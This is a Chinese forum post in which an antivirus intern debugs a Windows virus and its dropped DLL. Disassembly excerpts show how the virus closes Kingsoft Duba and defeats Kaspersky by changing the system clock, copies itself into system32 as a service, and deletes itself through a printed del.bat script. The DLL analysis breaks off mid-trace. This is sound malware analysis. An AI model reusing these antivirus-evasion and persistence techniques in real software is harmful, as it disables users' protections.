

# 前面版面上的一位仁兄贴的一个病毒，试着分析一下，呈现给大家（第一部分），（第二部分在 15 楼）

> 原文：[`www.pediy.com/kssd/pediy10/57868.html`](https://www.pediy.com/kssd/pediy10/57868.html)

工作不好找啊！！！![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!") ![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!") ![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")   
我学的是导弹和卫星，但是就是没有兴趣，钻研计算机倒是很深。可惜至今没有什么成就。  
终于在一家反病毒公司找到一个实习的机会，这几天在都在干活。  
于是前几天，在 pediy 的 bbs 上 download 了一个病毒回去分析。  
  
我在这里就只分析一个主程序，病毒释放的 dll 文件以后有时间就分析拉。其实今天我已经分析了一半了，但是公司已经下班了，我肚子也饿了。哈哈，抱歉！！！  
  
/////主程序部分  
  
首先跳 VC++程序的初始化部分  
00402BDE    E8 30F0FFFF     call    00401C13  
  
跟踪这个 CALL，来到真正入口点  
00401C13    55              push    ebp  
00401C14    8BEC            mov     ebp, esp  
00401C16    81EC E4040000   sub     esp, 4E4  
  
往下走，来到这里（可以进去看看，只是一个获取 Windows 当前版本的函数）  
00401CEA    E8 33050000     call    00402222                         ; 没什么东西：：获取当前 Windows 版本  
  
跳过，继续往下走  
00401D13    50              push    eax  
00401D14    E8 370D0000     call    <jmp.&msvcrt.\_mbscpy>  
00401D19    83C4 40         add     esp, 40  
00401D1C    68 00EC4000     push    0040EC00                         ; ASCII "au"  
00401D21    8D85 1CFDFFFF   lea     eax, dword ptr \[ebp-2E4\]  
00401D27    50              push    eax  
00401D28    E8 290D0000     call    <jmp.&msvcrt.\_mbscat>  
00401D2D    8D85 1CFDFFFF   lea     eax, dword ptr \[ebp-2E4\]  
00401D33    68 F8EB4000     push    0040EBF8                         ; ASCII "to.e"  
00401D38    50              push    eax  
00401D39    E8 180D0000     call    <jmp.&msvcrt.\_mbscat>  
00401D3E    8D85 1CFDFFFF   lea     eax, dword ptr \[ebp-2E4\]  
00401D44    68 F4EB4000     push    0040EBF4                         ; ASCII "xe"  
00401D49    50              push    eax  
00401D4A    E8 070D0000     call    <jmp.&msvcrt.\_mbscat>  
这里通过拼接方式获得字符串"auto.exe",(这个病毒有点奇怪，好多字符串都是通过拼接的方式得到的，难道作者是为了做免杀？？？但是这样太不节约代码了吧。)  
  
接着往下走（在 call 前打住！！！否则你就跟不到线程函数了）  
00401D57    50              push    eax  
00401D58    57              push    edi  
00401D59    57              push    edi  
00401D5A    68 A91B4000     push    00401BA9  
00401D5F    57              push    edi                          ; 创建线程，用来停止金山毒霸  
00401D60    57              push    edi  
00401D61    FF15 B0C04100   call    dword ptr \[<&kernel32.Create>; kernel32.CreateThread  
这个时候，看一下堆栈：  
0012FA1C   00000000  |pSecurity = NULL  
0012FA20   00000000  |StackSize = 0  
0012FA24   00401BA9  |ThreadFunction = 复件\_dum.00401BA9  //////写的很明白，这个就是线程函数入口地址  
0012FA28   00000000  |pThreadParm = NULL  
0012FA2C   00000000  |CreationFlags = 0  
0012FA30   0012FF08  \\pThreadId = 0012FF08  
  
还等什么？？！！赶紧在反汇编窗口按下 CTRL+G 输入这个地址吧，哈哈  
来到这里，下断  
00401BA9    53              push    ebx  
00401BAA    55              push    ebp  
00401BAB    56              push    esi  
  
在主线程中 F8 单步，没走几步，就在新建的线程入口处断下了  
因为主线程中：  
00401D6D    68 E8030000     push    3E8  
00401D72    FFD6            call    esi                          ; kernel32.Sleep  ///看见了吧，睡觉了  
  
下面我们开始跑子线程  
00401BBB    53              push    ebx  
00401BBC    68 BC1A4000     push    00401ABC                     ; 枚举窗口  
00401BC1    FF15 24C14100   call    dword ptr \[<&user32.EnumWind>; USER32.EnumWindows  
  
00401BCF    68 B0EB4000     push    0040EBB0                     ; 指向字符串"金山毒霸"，不信你可以在数据窗口跟踪一下  
00401BD4    68 98EB4000     push    0040EB98                     ; ASCII "#32770"  
00401BD9    53              push    ebx         ; 查找标题为"金山毒霸"的"#32770"类窗口  
00401BDA    53              push    ebx                          ; 注意 USER32.FindWindowExA 查找所有窗口，包括子窗口  
00401BDB    FFD6            call    esi                          ; USER32.FindWindowExA  
  
00401BE1    68 A8EB4000     push    0040EBA8                     ; ASCII "是(&Y)"  
00401BE6    68 A0EB4000     push    0040EBA0                     ; ASCII "Button"  
00401BEB    53              push    ebx                          ; 查找所有标题为"(是&Y)"的窗口  
00401BEC    50              push    eax  
00401BED    FFD6            call    esi                          ; USER32.FindWindowExA  
  
00401BF2    6A 01           push    1  
00401BF4    68 01020000     push    201  
00401BF9    55              push    ebp  
00401BFA    FFD7            call    edi                          ; USER32.SendMessageA  
  
00401BF2    6A 01           push    1                            ; 干什么？？？哈哈当然是发送一个按下的消息啦！！！  
00401BF4    68 01020000     push    201  
00401BF9    55              push    ebp  
00401BFA    FFD7            call    edi                          ; USER32.SendMessageA  
  
00401C0B    FF15 78C04100   call    dword ptr \[<&kernel32.Sleep>>; kernel32.Sleep  
00401C11  ^ EB A8           jmp     short 00401BBB  
以上一大片的代码的意思是这样的：  
第一：该子线程是一个经常 sleep 的无穷循环（如果不 sleep，你的电脑就得 CPU100%啦！！！）  
第二：在循环中，它不停查找标题为"金山毒霸"的窗口，如果存在则发送关闭消息，再发送消息按下"(是&Y)"，结果你就不能用"金山毒霸"啦（就是这点小伎俩，呵呵）。  
好了，到这里，这个线程分析完毕了。小功告成！！！  
  
  
回到主线程（之前你应该在这里下个断点，免得跟丢了）  
00401DAF    53              push    ebx  
00401DB0    50              push    eax  
00401DB1    E8 F6040000     call    004022AC    /////这个什么函数，进去看看; 实际上返回字符串"AD09E3"  
  
来到  
004022AC    55              push    ebp  
004022AD    8BEC            mov     ebp, esp  
004022AF    81EC 08010000   sub     esp, 108  
004022B5    53              push    ebx  
004022B6    56              push    esi  
004022B7    57              push    edi  
004022B8    E8 9FFFFFFF     call    0040225C                     ; 这个函数里面没有什么东西  
  
继续往下走，一路上不停的经过 sleep 和其他乱七八糟的东东，在你快要 sleep 的时候，来到  
00402341    50              push    eax                          ; "AD09E3"  
00402342    FF75 08         push    dword ptr \[ebp+8\]  
00402345    E8 2A070000     call    <jmp.&msvcrt.memcpy>  
"AD09E3"是什么东西？？？就是病毒将要注册的一个服务。怎么知道的？？？哈哈，不要告诉我你没有开虚拟机。在虚拟机里面中一下毒，不就知道了嘛。（用 regsnap 软件对比一下更容易看出来了）  
  
00401E20    50              push    eax  
00401E21    E8 86040000     call    004022AC                               ; 返回 ASCII "555E9A24",显然即将释放 555E9A24.dll  
  
00401E91    68 04010000     push    104  
00401E96    50              push    eax  
00401E97    6A 00           push    0                                      ; 获取自身可执行文件名称  
00401E99    FF15 A8C04100   call    dword ptr \[<&kernel32.GetModuleFileNam>; kernel32.GetModuleFileNameA  
00401E9F    85C0            test    eax, eax  
00401EA1    75 07           jnz     short 00401EAA  
00401EA3    8BC7            mov     eax, edi  
00401EA5    E9 73010000     jmp     0040201D  
00401EAA    8D85 1CFDFFFF   lea     eax, dword ptr \[ebp-2E4\]               ; 获取成功,跳到这里  
00401EB0    50              push    eax                                    ; "auto.exe"  
00401EB1    8D85 1CFCFFFF   lea     eax, dword ptr \[ebp-3E4\]  
00401EB7    50              push    eax                                    ; "C:\\Documents and Settings\\CTS.AnCui\\",D7,"烂",B8,"",B4,"件 dumped.exe"  
00401EB8    E8 A50B0000     call    <jmp.&msvcrt.strstr>                   ; 字符匹配  
00401EBD    59              pop     ecx  
00401EBE    85C0            test    eax, eax  
00401EC0    59              pop     ecx  
00401EC1    74 4D           je      short 00401F10  
00401EC3    8D85 1CFCFFFF   lea     eax, dword ptr \[ebp-3E4\]               ; 如果自身可执行文件是 auto.exe,执行下面代码  
00401EC9    50              push    eax  
00401ECA    E8 9F0B0000     call    <jmp.&msvcrt.strlen>  
00401ECF    83F8 02         cmp     eax, 2  
00401ED2    59              pop     ecx  
00401ED3    76 3B           jbe     short 00401F10  
00401ED5    0FBE85 1CFCFFFF movsx   eax, byte ptr \[ebp-3E4\]  
00401EDC    50              push    eax  
00401EDD    8D85 1CFCFFFF   lea     eax, dword ptr \[ebp-3E4\]  
00401EE3    68 DCEB4000     push    0040EBDC                               ; %c:\\  
00401EE8    50              push    eax  
00401EE9    897D FC         mov     dword ptr \[ebp-4\], edi  
00401EEC    E8 590B0000     call    <jmp.&msvcrt.sprintf>  
00401EF1    83C4 0C         add     esp, 0C  
00401EF4    8D85 1CFCFFFF   lea     eax, dword ptr \[ebp-3E4\]  
00401EFA    57              push    edi  
00401EFB    6A 00           push    0  
00401EFD    50              push    eax  
00401EFE    68 CCEB4000     push    0040EBCC                               ; explorer.exe  
00401F03    68 C4EB4000     push    0040EBC4                               ; open  
00401F08    6A 00           push    0                                      ; 这段代码比较有意思;但你双击驱动器盘符的时候,病毒执行自身的时候尽量伪装了一下自己,就是真的给你打开了你的驱动器;你很满意,但是实际上你被忽悠了!!!  
00401F0A    FF15 14C14100   call    dword ptr \[<&shell32.ShellExecuteA>\]   ; shell32.ShellExecuteA  
00401F10    E8 EBF0FFFF     call    00401000                               ; 如果可执行文件不是 auto.exe,跳到这里  
  
走到这里停一下  
00401F10    E8 EBF0FFFF     call    00401000  
  
进去，经过 N 多个 call    <jmp.&msvcrt.sprintf>  
0040125A    8D85 28FFFFFF   lea     eax, dword ptr \[ebp-D8\]  
00401260    56              push    esi  
00401261    50              push    eax  
00401262    E8 E3170000     call    <jmp.&msvcrt.sprintf>  
  
终于：  
00401267    68 10EB4000     push    0040EB10                     ; ASCII "avp.exe"  
0040126C    E8 1A130000     call    0040258B  
看到 "avp.exe"了，兴奋吧！？真正的战场近了。什么？？？你没有感觉？？？该不会是你不知道 avp.exe 是什么吧？？？那你就白菜了。  
  
进 call 吧，来到  
0040258B    55              push    ebp  
0040258C    8BEC            mov     ebp, esp  
0040258E    81EC 2C010000   sub     esp, 12C  
00402594    53              push    ebx  
00402595    56              push    esi  
00402596    57              push    edi  
00402597    33DB            xor     ebx, ebx  
00402599    E8 84FCFFFF     call    00402222                                    ; 这个 call 没什么东西  
  
以下就是通过三个 API 函数枚举进程（看看究竟进程中有没有 AVP.EXE）。具体怎么实现的，请看：  
004025AE    E8 95060000     call    <jmp.&kernel32.CreateToolhelp32Snapshot>  
004025BD    E8 80060000     call    <jmp.&kernel32.Process32First>  
00402614    E8 23060000     call    <jmp.&kernel32.Process32Next>  
0040261E    FF15 88C04100   call    dword ptr \[<&kernel32.CloseHandle>\]         ; kernel32.CloseHandle  
流程和罗老大的《Windows 环境下 32 位汇编语言程序设计》里面讲的一样！哈哈~~  
  
之后，返回。来看看怎么处理存在的"avp.exe"的：  
0040127E    8D45 F0         lea     eax, dword ptr \[ebp-10\]  
00401281    50              push    eax  
00401282    FF15 80C04100   call    dword ptr \[<&kernel32.GetSystemTime>\]       ; kernel32.GetSystemTime  
00401288    66:817D F0 D507 cmp     word ptr \[ebp-10\], 7D5  
0040128E    76 10           jbe     short 004012A0  
00401290    8D45 F0         lea     eax, dword ptr \[ebp-10\]  
00401293    66:C745 F0 D507 mov     word ptr \[ebp-10\], 7D5  
00401299    50              push    eax  
0040129A    FF15 7CC04100   call    dword ptr \[<&kernel32.SetSystemTime>\]       ; kernel32.SetSystemTime  
004012A0    68 204E0000     push    4E20  
004012A5    FF15 78C04100   call    dword ptr \[<&kernel32.Sleep>\]               ; kernel32.Sleep  ////这个 sleep 时间真 TM 长,不好意思说脏话了,病毒作者的 sleep 真 TM 多!!  
004012AB    6A 01           push    1  
004012AD    58              pop     eax  
004012AE    C9              leave  
004012AF    C3              retn  
又是利用卡巴斯基的注册机制缺陷。怎么讲？很简单，假如你购买的卡巴斯基使用期限是 2007 年 1 月到 2009 年 6 月，病毒把系统时间改为 2007 年 1 月之前或是 2009 年 6 月之后，卡巴斯基的系统实时保护就被 DIABLE 了。也不知道卡巴斯基会不会修正这个缺陷。  
  
接着运行  
00401F3B    53              push    ebx  
00401F3C    50              push    eax  
00401F3D    FF15 A0C04100   call    dword ptr \[<&kernel32.lstrcpy>\]             ; kernel32.lstrcpyA  
到这里时,堆栈中  
0012FA2C   0012FA40  |String1 = 0012FA40  
0012FA30   0040E310  \\String2 = "3FD1E80C.EXE"  
病毒开始拷贝自身了哦  
  
继续往下  
00401F49    57              push    edi  
00401F4A    50              push    eax                                         ; ASCII "3FD1E80C.EXE"  
00401F4B    E8 20010000     call    00402070  
  
进去!看病毒是如何分身的:  
004020AC    57              push    edi  
004020AD    50              push    eax  
004020AE    FF15 A4C04100   call    dword ptr \[<&kernel32.GetSystemDirectoryA>\] ; kernel32.GetSystemDirectoryA  
找一找系统目录,这个嘛,还是必需的  
004020FC    57              push    edi  
004020FD    50              push    eax  
004020FE    6A 00           push    0  
00402100    FF15 A8C04100   call    dword ptr \[<&kernel32.GetModuleF>; kernel32.GetModuleFileNameA  
00402106    85C0            test    eax, eax  
00402108  ^ 74 AE           je      short 004020B8  
0040210A    8B35 34C14100   mov     esi, dword ptr \[<&user32.CharUpp>; USER32.CharUpperA  
00402110    8D85 F8FEFFFF   lea     eax, dword ptr \[ebp-108\]  
00402116    50              push    eax  
00402117    FFD6            call    esi  
00402119    50              push    eax  
0040211A    8D85 F0FDFFFF   lea     eax, dword ptr \[ebp-210\]  
00402120    50              push    eax                              ; "C:\\WINDOWS\\SYSTEM32\\3FD1E80C.EXE"  
00402121    FFD6            call    esi  
00402123    50              push    eax                              ; "C:\\DOCUMENTS AND SETTINGS\\CTS.ANCUI\\",D7,"烂",B8,"",B4,"件 DUMPED.EXE"  
00402124    E8 39090000     call    <jmp.&msvcrt.strstr>             ; 匹配文件名  
00402129    59              pop     ecx  
0040212A    85C0            test    eax, eax  
0040212C    59              pop     ecx  
0040212D    74 04           je      short 00402133  
0040212F    33C0            xor     eax, eax                           
00402131    EB 1A           jmp     short 0040214D         ; 如果当前文件是"C:\\WINDOWS\\SYSTEM32\\3FD1E80C.EXE",跳走  
00402133    8D85 F8FEFFFF   lea     eax, dword ptr \[ebp-108\]         ; 如果当前文件不是"C:\\WINDOWS\\SYSTEM32\\3FD1E80C.EXE",跳到这里执行  
00402139    50              push    eax  
0040213A    8D85 F0FDFFFF   lea     eax, dword ptr \[ebp-210\]  
00402140    50              push    eax                              ; ASCII "C:\\WINDOWS\\SYSTEM32\\3FD1E80C.EXE"  
00402141    E8 DEFEFFFF     call    00402024                         ; 复制自身到%SYSTEM32%\\3FD1E80C.EXE，分身部分  
00402146    F7D8            neg     eax  
  
分身,进去  
00402024    55              push    ebp  
00402025    8BEC            mov     ebp, esp  
00402027    83EC 20         sub     esp, 20  
0040202A    6A 1E           push    1E  
0040202C    8D45 E0         lea     eax, dword ptr \[ebp-20\]  
0040202F    6A 00           push    0  
00402031    50              push    eax  
00402032    E8 310A0000     call    <jmp.&msvcrt.memset>  
00402037    8B45 08         mov     eax, dword ptr \[ebp+8\]  
0040203A    8365 F6 00      and     dword ptr \[ebp-A\], 0  
0040203E    8365 E0 00      and     dword ptr \[ebp-20\], 0  
00402042    8365 FA 00      and     dword ptr \[ebp-6\], 0  
00402046    8945 E8         mov     dword ptr \[ebp-18\], eax  
00402049    8B45 0C         mov     eax, dword ptr \[ebp+C\]  
0040204C    83C4 0C         add     esp, 0C  
0040204F    8945 EC         mov     dword ptr \[ebp-14\], eax  
00402052    8D45 E0         lea     eax, dword ptr \[ebp-20\]  
00402055    66:C745 F0 1000 mov     word ptr \[ebp-10\], 10  
0040205B    50              push    eax  
0040205C    C745 E4 0200000>mov     dword ptr \[ebp-1C\], 2  
00402063    FF15 10C14100   call    dword ptr \[<&shell32.SHFileOperation>\]      ; shell32.SHFileOperationA  
00402069    F7D8            neg     eax  
0040206B    1BC0            sbb     eax, eax  
0040206D    40              inc     eax  
0040206E    C9              leave  
0040206F    C3              retn  
关键就是 SHFileOperation 这个 API 是什么意思!!!想知道具体的,查手册吧!!!但是这里我猜就是一个拷贝自身到%SYSTEM32%\\3FD1E80C.EXE 的过程。  
不信，可以看看堆栈中：  
0012F7D8   0012F7DC  
0012F7DC   00000000  
翻一下内存 0012F7DC：  
0012F7DC  00 00 00 00 02 00 00 00 14 F8 12 00 1C F9 12 00    .......?.?.  
两个地址 0012f814 和 0012f91c  
看看：  
0012F814  43 3A 5C 44 4F 43 55 4D 45 4E 54 53 20 41 4>C:\\DOCUMENTS AND  
0012F824  20 53 45 54 54 49 4E 47 53 5C 43 54 53 2E 4> SETTINGS\\CTS.AN  
0012F834  43 55 49 5C D7 C0 C3 E6 5C B8 B4 BC FE 20 4>CUI\\桌面\\复件 DU  
0012F844  4D 50 45 44 2E 45 58 45 00 00 00 00 00 00 0>MPED.EXE........  
0012F854  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F864  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F874  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F884  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F894  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F8A4  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F8B4  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F8C4  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F8D4  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F8E4  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F8F4  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F904  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
0012F914  00 00 00 00 00 00 00 00 43 3A 5C 57 49 4E 4>........C:\\WINDO  
0012F924  57 53 5C 53 59 53 54 45 4D 33 32 5C 33 46 4>WS\\SYSTEM32\\3FD1  
0012F934  45 38 30 43 2E 45 58 45 00 00 00 00 00 00 0>E80C.EXE........  
0012F944  00 00 00 00 00 00 00 00 00 00 00 00 00 00 0>................  
  
一直跑到  
00401FD3    68 BCEB4000     push    0040EBBC                                    ;  -k  
00401FD8    50              push    eax                                         ; "C:\\WINDOWS\\system32\\3FD1E80C.EXE"  
00401FD9    FF15 9CC04100   call    dword ptr \[<&kernel32.lstrcat>\]             ; kernel32.lstrcatA  
00401FDF    57              push    edi  
00401FE0    68 B80B0000     push    0BB8  
00401FE5    8D85 1CFBFFFF   lea     eax, dword ptr \[ebp-4E4\]  
00401FEB    68 50ED4000     push    0040ED50                                    ; ASCII "555E9A24"  
00401FF0    50              push    eax                                         ; ASCII "C:\\WINDOWS\\system32\\3FD1E80C.EXE -k"  
00401FF1    BB 10E64000     mov     ebx, 0040E610                               ; ASCII "AD09E3"  
00401FF6    68 10E54000     push    0040E510                                    ; ASCII "AD09E3"  
00401FFB    53              push    ebx  
00401FFC    E8 9B030000     call    0040239C  
病毒开始修改注册表和添加服务了：  
  
进去？？？肯定要进去的，但是我懒得讲了，因为一进去满眼都是注册表操作和服务操作。经过这一顿操作，你的注册表中多出：  
Windows Registry Editor Version 5.00  
  
\[HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\AD09E3\]  
"Type"=dword:00000010  
"Start"=dword:00000002  
"ErrorControl"=dword:00000001  
"ImagePath"="C:\\\\WINDOWS\\\\system32\\\\3FD1E80C.EXE -k"  
"DisplayName"="AD09E3"  
"ObjectName"="LocalSystem"  
"Description"="555E9A24"  
  
\[HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\AD09E3\\Security\]  
"Security"=hex:01,00,14,80,90,00,00,00,9c,00,00,00,14,00,00,00,30,00,00,00,02,\\  
  00,1c,00,01,00,00,00,02,80,14,00,ff,01,0f,00,01,01,00,00,00,00,00,01,00,00,\\  
  00,00,02,00,60,00,04,00,00,00,00,00,14,00,fd,01,02,00,01,01,00,00,00,00,00,\\  
  05,12,00,00,00,00,00,18,00,ff,01,0f,00,01,02,00,00,00,00,00,05,20,00,00,00,\\  
  20,02,00,00,00,00,14,00,8d,01,02,00,01,01,00,00,00,00,00,05,0b,00,00,00,00,\\  
  00,18,00,fd,01,02,00,01,02,00,00,00,00,00,05,20,00,00,00,23,02,00,00,01,01,\\  
  00,00,00,00,00,05,12,00,00,00,01,01,00,00,00,00,00,05,12,00,00,00  
  
\[HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\AD09E3\\Enum\]  
"0"="Root\\\\LEGACY\_AD09E3\\\\0000"  
"Count"=dword:00000001  
"NextInstance"=dword:00000001  
  
下面继续：  
00402001    53              push    ebx  
00402002    E8 4E030000     call    00402355                                    ; 开启服务  
  
进去：  
00402355    56              push    esi  
00402356    57              push    edi  
00402357    68 3F000F00     push    0F003F  
0040235C    6A 00           push    0  
0040235E    6A 00           push    0  
00402360    FF15 30C04100   call    dword ptr \[<&advapi32.OpenSCManagerA>\] ; advapi32.OpenSCManagerA  
00402366    8BF8            mov     edi, eax  
00402368    85FF            test    edi, edi  
0040236A    74 2D           je      short 00402399  
0040236C    68 FF010F00     push    0F01FF  
00402371    FF7424 10       push    dword ptr \[esp+10\]  
00402375    57              push    edi  
00402376    FF15 20C04100   call    dword ptr \[<&advapi32.OpenServiceA>\]   ; advapi32.OpenServiceA  
0040237C    8BF0            mov     esi, eax  
0040237E    85F6            test    esi, esi  
00402380    74 17           je      short 00402399  
00402382    6A 00           push    0  
00402384    6A 00           push    0  
00402386    56              push    esi  
00402387    FF15 1CC04100   call    dword ptr \[<&advapi32.StartServiceA>\]  ; advapi32.StartServiceA  
0040238D    56              push    esi  
0040238E    8B35 28C04100   mov     esi, dword ptr \[<&advapi32.CloseServic>; advapi32.CloseServiceHandle  
00402394    FFD6            call    esi  
00402396    57              push    edi  
00402397    FFD6            call    esi  
00402399    5F              pop     edi  
0040239A    5E              pop     esi  
0040239B    C3              retn  
所有都比较好理解。反正就是开启一个服务。这个服务就是病毒运行%system32%\\3FD1E80C.EXE，也就是自身的复制品。这个复制品会释放并装载%sysytem32%\\555E9A24.DLL，至于这个 dll 如何破坏你的系统，一言难尽。  
  
  
下面到删除文件了自身了：  
00402010    E8 9BF2FFFF     call    004012B0  
  
进去：  
004012B0    55              push    ebp  
004012B1    8BEC            mov     ebp, esp  
004012B3    81EC 08040000   sub     esp, 408  
004012B9    8D85 F8FCFFFF   lea     eax, dword ptr \[ebp-308\]  
004012BF    68 FF000000     push    0FF  
004012C4    50              push    eax  
004012C5    6A 00           push    0                                      ; 获取当前文件名称  
004012C7    FF15 A8C04100   call    dword ptr \[<&kernel32.GetModuleFileNam>; kernel32.GetModuleFileNameA  
004012CD    8D85 F8FDFFFF   lea     eax, dword ptr \[ebp-208\]  
004012D3    68 FE000000     push    0FE  
004012D8    50              push    eax                                    ; 获取系统目录  
004012D9    FF15 A4C04100   call    dword ptr \[<&kernel32.GetSystemDirecto>; kernel32.GetSystemDirectoryA  
  
0040131A    68 6CEB4000     push    0040EB6C                               ; ASCII "del.bat"  
0040131F    50              push    eax  
00401320    FF15 9CC04100   call    dword ptr \[<&kernel32.lstrcat>\]        ; kernel32.lstrcatA  
00401326    8D85 F8FDFFFF   lea     eax, dword ptr \[ebp-208\]  
0040132C    68 10E34000     push    0040E310                               ; ASCII "3FD1E80C.EXE"  
00401331    50              push    eax  
留心这些带有关键字句的地方。  
  
00401378    50              push    eax  
00401379    50              push    eax  
0040137A    6A 02           push    2  
0040137C    50              push    eax  
0040137D    50              push    eax  
0040137E    8D85 F8FBFFFF   lea     eax, dword ptr \[ebp-408\]  
00401384    68 00000040     push    40000000  
00401389    50              push    eax  
0040138A    FF15 94C04100   call    dword ptr \[<&kernel32.CreateFileA>\]    ; kernel32.CreateFileA  
这个时候堆栈中：  
0012F5FC   0012F624  |FileName = "C:\\WINDOWS\\system32\\del.bat"  
0012F600   40000000  |Access = GENERIC\_WRITE  
0012F604   00000000  |ShareMode = 0  
0012F608   00000000  |pSecurity = NULL  
0012F60C   00000002  |Mode = CREATE\_ALWAYS  
0012F610   00000000  |Attributes = 0  
0012F614   00000000  \\hTemplateFile = NULL  
  
继续往下走：（经过大量的对"C:\\WINDOWS\\system32\\del.bat"的文件写操作）  
0040155E    6A 01           push    1  
00401560    5F              pop     edi  
00401561    FF75 FC         push    dword ptr \[ebp-4\]  
00401564    FF15 88C04100   call    dword ptr \[<&kernel32.CloseHandle>\]    ; kernel32.CloseHandle  
  
这个时候：%system32%\\del.bat 之中的内容是：  
@echo off  
:selfkill  
del /F /Q "C:\\DOCUMENTS AND SETTINGS\\CTS.ANCUI\\桌面\\复件 DUMPED.EXE"  
if exist "C:\\DOCUMENTS AND SETTINGS\\CTS.ANCUI\\桌面\\复件 DUMPED.EXE" goto selfkill  
del %0  
说白了就是删除自身。  
  
紧接着，执行这个 del.bat：  
0040156A    8D85 F8FBFFFF   lea     eax, dword ptr \[ebp-408\]  
00401570    6A 00           push    0  
00401572    50              push    eax  
00401573    FF15 84C04100   call    dword ptr \[<&kernel32.WinExec>\]        ; kernel32.WinExec  
  
经过一系列的 sleep 和 ret 后，程序结束。  
  
这个病毒会使得金山毒霸和卡巴斯基失效，注册自身的复制品为系统服务程序，在它释放并装在的 dll 中甚至有远程线程线程注入的代码。时间不够没有分析完。  
作者的确是够老手，壳是未知的，为了躲避查杀代码乱的一团糟。  
  
http://bbs.pediy.com/attachment.php?attachmentid=11006&stc=1&d=1199705684  
  
  
谢谢观摩！！！  
祝各位一切顺利！！！

上传的附件
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || b.rar  
 |

昨天把病毒释放的 DLL 分析了一下，果然病毒比较厉害。  
  
病毒衍生的 dll 文件名称为%system32%\\555E9A24.DLL  
  
开始，用 OD 装载 DLL，入口点处  
10002ED9 >/$  55            push    ebp  
10002EDA  |.  8BEC          mov     ebp, esp  
10002EDC  |.  81EC CC000000 sub     esp, 0CC  
10002EE2  |.  56            push    esi  
10002EE3  |.  BE 00AE0010   mov     esi, 1000AE00  
10002EE8  |.  57            push    edi  
10002EE9  |.  8D85 38FFFFFF lea     eax, dword ptr \[ebp-C8\]  
10002EEF  |.  56            push    esi                                 ; |format => ""  
10002EF0  |.  50            push    eax                                 ; |s  
10002EF1  |.  E8 AA140000   call    <jmp.&MSVCRT.sprintf>               ; \\sprintf  
  
不用理会一路的 sprintf 和 sleep，走啊走啊，终于来到正题  
100034BD  |.  50            push    eax                                 ; /pThreadId  
100034BE  |.  33C0          xor     eax, eax                            ; |  
100034C0  |.  50            push    eax                                 ; |CreationFlags => 0  
100034C1  |.  50            push    eax                                 ; |pThreadParm => NULL  
100034C2  |.  68 CB250010   push    100025CB                            ; |ThreadFunction = 555E9A24.100025CB   ////等到创建了线程后，跟过去吧  
100034C7  |.  50            push    eax                                 ; |StackSize => 0  
100034C8  |.  50            push    eax                                 ; |pSecurity => NULL  
100034C9  |.  FF15 B4500010 call    dword ptr \[<&KERNEL32.CreateThread>>; \\CreateThread  
100034CF  |> \\8BC7          mov     eax, edi  
100034D1  |.  5F            pop     edi  
100034D2  |.  5E            pop     esi  
100034D3  |.  C9            leave  
100034D4  \\.  C2 0C00       retn    0C  
  
到这里程序就结束了，现在就是跟踪主线程创建的子线程.  
CTRL+G，输入 100025CB，来到  
100025CB  /.  55            push    ebp  
100025CC  |.  8BEC          mov     ebp, esp  
100025CE  |.  81EC E4030000 sub     esp, 3E4  
100025D4  |.  53            push    ebx  
  
右键，此处为新 EIP（反正我是用这种方式跟踪线程的，感觉挺不错的，因为堆栈肯定是平衡的）  
继续前进吧  
10002634  |.  50            push    eax                                 ;  ASCII "AD09E3"  
10002635  |.  8D85 2CFEFFFF lea     eax, dword ptr \[ebp-1D4\]  
1000263B  |.  50            push    eax                                 ;  ASCII "AD09E3"  
1000263C  |.  E8 200F0000   call    10003561                            ;  没什么东西，都是一些字符串运算，返回 ASCII "3FD1E80C"的函数  
  
紧接着，又是一堆字符串运算的函数和一堆 sleep，统统跳过，来到  
100026D9  |.  68 90700010   push    10007090  
100026DE  |.  E8 59040000   call    10002B3C  
  
进去  
10002B92  |.  68 04010000   push    104                                 ; /BufSize = 104 (260.)  
10002B97  |.  50            push    eax                                 ; |Buffer  
10002B98  |.  FF15 B0500010 call    dword ptr \[<&KERNEL32.GetSystemDire>; \\GetSystemDirectoryA    ///获取系统目录  
  
病毒又在组装字符串，得到%system32%\\3FD1E80C.EXE，并打开这个文件（它想干什么？？？继续跟踪把）  
10002E0C  |.  68 A06B0010   push    10006BA0                            ; /StringToAdd = "\\"  
10002E11  |.  50            push    eax                                 ; |ConcatString  
10002E12  |.  FF15 AC500010 call    dword ptr \[<&KERNEL32.lstrcatA>\]    ; \\lstrcatA  
10002E18  |.  8D85 2CFEFFFF lea     eax, dword ptr \[ebp-1D4\]  
10002E1E  |.  68 04630010   push    10006304                            ; /src = "3FD1E80C.EXE"  
10002E23  |.  50            push    eax                                 ; |dest  
10002E24  |.  E8 83150000   call    <jmp.&MSVCRT.strcat>                ; \\strcat  
10002E29  |.  8D85 2CFEFFFF lea     eax, dword ptr \[ebp-1D4\]  
10002E2F  |.  68 CC6D0010   push    10006DCC                            ; /mode = "rb"  
10002E34  |.  50            push    eax                                 ; |path  
10002E35  |.  E8 F0150000   call    <jmp.&MSVCRT.fopen>                 ; \\fopen  ///文件的 path = "C:\\WINDOWS\\system32\\3FD1E80C.EXE"  
  
从文件%system32%\\3FD1E80C.EXE 里面读出一个字符串  
10002EB6  |.  FF75 FC       push    dword ptr \[ebp-4\]  
10002EB9  |.  8D85 28FDFFFF lea     eax, dword ptr \[ebp-2D8\]  
10002EBF  |.  FF75 08       push    dword ptr \[ebp+8\]  
